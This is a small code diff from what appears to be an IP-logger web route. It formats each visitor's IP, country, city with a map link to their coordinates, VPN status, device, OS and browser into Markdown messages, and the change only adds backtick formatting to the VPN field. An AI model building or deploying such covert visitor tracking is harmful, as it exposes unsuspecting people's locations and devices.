@@ -16,7 +16,7 @@ router.get("/", async (ctx) => {
   const countryinfo = encodeURIComponent(`**COUNTRY** : \`${info.country}\``);
   const cityInfo = encodeURIComponent(`**CITY** : \[${info.city}\]\(https://www.google.com/maps/search/?api=1&query=${info.lat}%2C${info.lon}\)`);
   const iptext = encodeURIComponent(`**IP** : \[${ip}\]\(https://ip2location.io/${ip}\)`);
-  const vpn = encodeURIComponent(`**VPN** : ${info.proxy}`);
+  const vpn = encodeURIComponent(`**VPN** : \`${info.proxy}\``);
   const device_v = encodeURIComponent(`**DEVICE** : ${device.type}`);
   const device_os = encodeURIComponent(`**SYSTEM** : ${os.name}`);
   const browser_v = encodeURIComponent(`**BROWSER** : ${browser.name}`);
